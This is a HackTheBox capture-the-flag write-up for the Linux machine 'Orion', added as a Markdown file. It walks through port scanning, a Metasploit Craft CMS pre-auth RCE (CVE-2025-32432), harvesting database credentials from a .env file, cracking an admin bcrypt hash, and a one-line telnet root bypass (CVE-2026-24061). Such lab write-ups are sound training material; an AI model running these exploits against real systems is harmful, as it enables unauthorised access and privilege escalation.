@@ -1,0 +1,428 @@
+---
+title: Orion
+description: Máquina Linux de dificultad muy fácil
+tags: [hackthebox, linux, http, craftcms, cve-2025-32432, rce, mysql, hash-cracking, ssh, telnet, cve-2026-24061, privilege-escalation]
+draft: false
+lang: es
+parent: writeups/hackthebox/machines
+featured: true
+image: ../../../../../images/writeups/hackthebox/orion/orion.png
+difficulty: easy
+platform: htb
+os: linux
+hints: [Craft CMS unauthenticated RCE, .env credentials disclosure, Password hash cracking, Telnet privilege escalation]
+translationId: orion
+---
+
+<div style="display: flex; justify-content: center;">
+
+![Cap](@images/writeups/hackthebox/orion/orion.png)
+
+</div>
+
+<div style="text-align: center;">
+
+[https://app.hackthebox.com/machines/Orion](https://app.hackthebox.com/machines/orion)
+
+</div>
+
+## Enumeration
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/Orion 10.129.44.11
+```
+
+```plaintext
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openPorts 10.129.44.11
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
+|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://orion.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://orion.htb/FUZZ -ic -c -t 100
+```
+
+```plaintext
+index                   [Status: 200, Size: 12272, Words: 1076, Lines: 386, Duration: 345ms]
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 235ms]
+assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 169ms]
+logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 172ms]
+``` 
+
+[http://orion.htb/admin/login](http://orion.htb/admin/login)
+
+<div style="display: flex; justify-content: center;">
+
+![Web Admin](@images/writeups/hackthebox/orion/web-admin.png)
+
+</div>
+
+Craft CMS 5.6.16
+
+[https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/](https://www.rapid7.com/db/modules/exploit/linux/http/craftcms_preauth_rce_cve_2025_32432/)
+
+```bash
+msf > use /craftcms_preauth_rce_cve_2025_32432
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set rhosts orion.htb
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set lhost 10.10.14.192
+msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > exploit
+```
+
+```bash
+www-data@orion:~/html/craft/web$ cd ..
+```
+
+```bash
+www-data@orion:~/html/craft$ ls -R /home
+```
+
+```plaintext
+ls -R /home
+/home:
+adam
+ls: cannot open directory '/home/adam': Permission denied
+```
+
+```bash
+www-data@orion:~/html/craft$ ls -la
+```
+
+```plaintext
+ls -la
+total 364
+drwxrwxr-x  7 www-data www-data   4096 Mar  6 11:22 .
+drwxr-xr-x  3 root     root       4096 Mar  6 11:19 ..
+-rw-rw-r--  1 www-data www-data    718 Mar  6 11:24 .env
+-rw-rw-r--  1 www-data www-data    411 Nov 18  2025 .env.example.dev
+-rw-rw-r--  1 www-data www-data    623 Nov 18  2025 .env.example.production
+-rw-rw-r--  1 www-data www-data    619 Nov 18  2025 .env.example.staging
+-rw-rw-r--  1 www-data www-data     31 Nov 18  2025 .gitignore
+-rw-rw-r--  1 www-data www-data    624 Nov 18  2025 bootstrap.php
+-rw-rw-r--  1 www-data www-data    611 Mar  6 11:20 composer.json
+-rw-rw-r--  1 www-data www-data 310507 Mar  6 11:20 composer.lock
+drwxrwxr-x  4 www-data www-data   4096 Mar  6 11:26 config
+-rwxr-xr-x  1 www-data www-data    309 Nov 18  2025 craft
+drwxrwxr-x  5 www-data www-data   4096 Mar  6 11:24 storage
+drwxrwxr-x  2 www-data www-data   4096 Mar 10 10:46 templates
+drwxrwxr-x 49 www-data www-data   4096 Mar  6 11:20 vendor
+drwxrwxr-x  4 www-data www-data   4096 Mar  7 15:31 web
+```
+
+```bash
+www-data@orion:~/html/craft$ cat .env
+```
+
+```plaintext
+cat .env
+# Read about configuration, here:
+# https://craftcms.com/docs/5.x/configure.html
+
+# The application ID used to to uniquely store session and cache data, mutex locks, and more
+CRAFT_APP_ID=CraftCMS--67912ad2-1f1b-4993-bfec-e64daa5c23ff
+
+# The environment Craft is currently running in (dev, staging, production, etc.)
+CRAFT_ENVIRONMENT=dev
+
+# General settings
+CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DISALLOW_ROBOTS=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
+CRAFT_DB_SCHEMA=
+CRAFT_DB_TABLE_PREFIX=
+
+PRIMARY_SITE_URL=http://orion.htb/
+```
+
+```bash
+www-data@orion:~/html/craft$ mysql -u root -D orion -p
+```
+
+```plaintext
+mysql -u root -D orion -p
+Enter password: SuperSecureCraft123Pass!
+
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 52
+Server version: 10.6.23-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+```
+
+```bash
+MariaDB [orion]> SHOW tables;
+```
+
+```plaintext
+SHOW tables;
++----------------------------+
+| Tables_in_orion            |
++----------------------------+
+| addresses                  |
+| announcements              |
+| assetindexdata             |
+| assetindexingsessions      |
+| assets                     |
+| assets_sites               |
+| authenticator              |
+| categories                 |
+| categorygroups             |
+| categorygroups_sites       |
+| changedattributes          |
+| changedfields              |
+| craftidtokens              |
+| deprecationerrors          |
+| drafts                     |
+| elementactivity            |
+| elements                   |
+| elements_bulkops           |
+| elements_owners            |
+| elements_sites             |
+| entries                    |
+| entries_authors            |
+| entrytypes                 |
+| fieldlayouts               |
+| fields                     |
+| globalsets                 |
+| gqlschemas                 |
+| gqltokens                  |
+| imagetransformindex        |
+| imagetransforms            |
+| info                       |
+| migrations                 |
+| plugins                    |
+| projectconfig              |
+| queue                      |
+| recoverycodes              |
+| relations                  |
+| resourcepaths              |
+| revisions                  |
+| searchindex                |
+| sections                   |
+| sections_entrytypes        |
+| sections_sites             |
+| sequences                  |
+| sessions                   |
+| shunnedmessages            |
+| sitegroups                 |
+| sites                      |
+| sso_identities             |
+| structureelements          |
+| structures                 |
+| systemmessages             |
+| taggroups                  |
+| tags                       |
+| tokens                     |
+| usergroups                 |
+| usergroups_users           |
+| userpermissions            |
+| userpermissions_usergroups |
+| userpermissions_users      |
+| userpreferences            |
+| users                      |
+| volumefolders              |
+| volumes                    |
+| webauthn                   |
+| widgets                    |
++----------------------------+
+66 rows in set (0.001 sec)
+```
+
+```bash
+MariaDB [orion]> DESCRIBE users;
+```
+
+```plaintext
+DESCRIBE users;
++----------------------------+---------------------+------+-----+---------+-------+
+| Field                      | Type                | Null | Key | Default | Extra |
++----------------------------+---------------------+------+-----+---------+-------+
+| id                         | int(11)             | NO   | PRI | NULL    |       |
+| photoId                    | int(11)             | YES  | MUL | NULL    |       |
+| affiliatedSiteId           | int(11)             | YES  | MUL | NULL    |       |
+| active                     | tinyint(1)          | NO   | MUL | 0       |       |
+| pending                    | tinyint(1)          | NO   | MUL | 0       |       |
+| locked                     | tinyint(1)          | NO   | MUL | 0       |       |
+| suspended                  | tinyint(1)          | NO   | MUL | 0       |       |
+| admin                      | tinyint(1)          | NO   |     | 0       |       |
+| username                   | varchar(255)        | YES  | MUL | NULL    |       |
+| fullName                   | varchar(255)        | YES  |     | NULL    |       |
+| firstName                  | varchar(255)        | YES  |     | NULL    |       |
+| lastName                   | varchar(255)        | YES  |     | NULL    |       |
+| email                      | varchar(255)        | YES  | MUL | NULL    |       |
+| password                   | varchar(255)        | YES  |     | NULL    |       |
+| lastLoginDate              | datetime            | YES  |     | NULL    |       |
+| lastLoginAttemptIp         | varchar(45)         | YES  |     | NULL    |       |
+| invalidLoginWindowStart    | datetime            | YES  |     | NULL    |       |
+| invalidLoginCount          | tinyint(3) unsigned | YES  |     | NULL    |       |
+| lastInvalidLoginDate       | datetime            | YES  |     | NULL    |       |
+| lockoutDate                | datetime            | YES  |     | NULL    |       |
+| hasDashboard               | tinyint(1)          | NO   |     | 0       |       |
+| verificationCode           | varchar(255)        | YES  | MUL | NULL    |       |
+| verificationCodeIssuedDate | datetime            | YES  |     | NULL    |       |
+| unverifiedEmail            | varchar(255)        | YES  |     | NULL    |       |
+| passwordResetRequired      | tinyint(1)          | NO   |     | 0       |       |
+| lastPasswordChangeDate     | datetime            | YES  |     | NULL    |       |
+| dateCreated                | datetime            | NO   |     | NULL    |       |
+| dateUpdated                | datetime            | NO   |     | NULL    |       |
++----------------------------+---------------------+------+-----+---------+-------+
+28 rows in set (0.001 sec)
+```
+
+```bash
+MariaDB [orion]> SELECT username,password FROM users;
+```
+
+```plaintext
+SELECT username,password FROM users;
++----------+--------------------------------------------------------------+
+| username | password                                                     |
++----------+--------------------------------------------------------------+
+| admin    | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS |
++----------+--------------------------------------------------------------+
+1 row in set (0.001 sec)
+```
+
+```bash
+echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > admin.hash
+```
+
+```bash
+hashcat --identify admin.hash 
+```
+
+```plaintext
+The following 6 hash-modes match the structure of your input hash:
+
+      # | Name                                                       | Category
+  ======+============================================================+======================================
+  25600 | bcrypt(md5($pass))                                         | Generic KDF
+  25800 | bcrypt(sha1($pass))                                        | Generic KDF
+  30600 | bcrypt(sha256($pass))                                      | Generic KDF
+  28400 | bcrypt(sha512($pass))                                      | Generic KDF
+   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
+  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
+```
+
+```bash
+hashcat -m 3200 admin.hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt
+```
+
+```plaintext
+$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS:darkangel
+```
+
+```bash
+ssh adam@orion.htb
+```
+
+```bash
+adam@orion:~$ ls -la
+```
+
+```plaintext
+total 40
+drwxr-x--- 5 adam adam 4096 May 12 08:15 .
+drwxr-xr-x 3 root root 4096 May 12 08:15 ..
+lrwxrwxrwx 1 root root    9 May  7 12:28 .bash_history -> /dev/null
+-rw-r--r-- 1 adam adam  220 Jan  6  2022 .bash_logout
+-rw-r--r-- 1 adam adam 3771 Jan  6  2022 .bashrc
+drwx------ 3 adam adam 4096 May 12 08:15 .cache
+drwxrwxr-x 3 adam adam 4096 May 12 08:15 .config
+drwxrwxr-x 3 adam adam 4096 May 12 08:15 .local
+-rw-r--r-- 1 adam adam  807 Jan  6  2022 .profile
+-rw-r----- 1 root adam   33 Jul  2 00:56 user.txt
+-rw-rw-r-- 1 adam adam  166 Mar  6 13:34 .wget-hsts
+```
+
+```bash
+adam@orion:~$ cat user.txt 
+```
+
+```plaintext
+5ca2e73800eb21c79a327dbadf2dafd9
+```
+
+```bash
+adam@orion:~$ ss -tl
+```
+
+```plaintext
+State               Recv-Q              Send-Q                           Local Address:Port                             Peer Address:Port             Process             
+LISTEN              0                   10                                   127.0.0.1:telnet                                0.0.0.0:*                                    
+LISTEN              0                   128                                    0.0.0.0:ssh                                   0.0.0.0:*                                    
+LISTEN              0                   511                                    0.0.0.0:http                                  0.0.0.0:*                                    
+LISTEN              0                   80                                   127.0.0.1:mysql                                 0.0.0.0:*                                    
+LISTEN              0                   4096                             127.0.0.53%lo:domain                                0.0.0.0:*                                    
+LISTEN              0                   128                                       [::]:ssh                                      [::]:*
+```
+
+```bash
+adam@orion:~$ telnet -V
+```
+
+```plaintext
+telnet (GNU inetutils) 2.7
+```
+
+[https://www.offsec.com/blog/cve-2026-24061/](https://www.offsec.com/blog/cve-2026-24061/)
+
+```bash
+adam@orion:~$ USER='-f root' telnet -a 127.0.0.1
+```
+
+```bash
+root@orion:~# ls -la
+```
+
+```plaintext
+total 48
+drwx------  8 root root 4096 Jul  2 00:56 .
+drwxr-xr-x 19 root root 4096 May 12 08:15 ..
+lrwxrwxrwx  1 root root    9 May  7 12:28 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
+drwx------  3 root root 4096 Mar  6 10:04 .cache
+drwxr-xr-x  3 root root 4096 Mar  6 10:04 .config
+drwx------  3 root root 4096 Mar  6 10:17 .launchpadlib
+drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
+-rw-r--r--  1 root root  161 Jul  9  2019 .profile
+-rw-r-----  1 root root   33 Jul  2 00:56 root.txt
+drwx------  3 root root 4096 Apr 27  2023 snap
+drwx------  2 root root 4096 Apr 27  2023 .ssh
+-rw-r--r--  1 root root  165 May  7 12:25 .wget-hsts
+```
+
+```bash
+root@orion:~# cat root.txt 
+```
+
+```plaintext
+f973ab6dd40d35aeea4d6ce543494ecf
+```
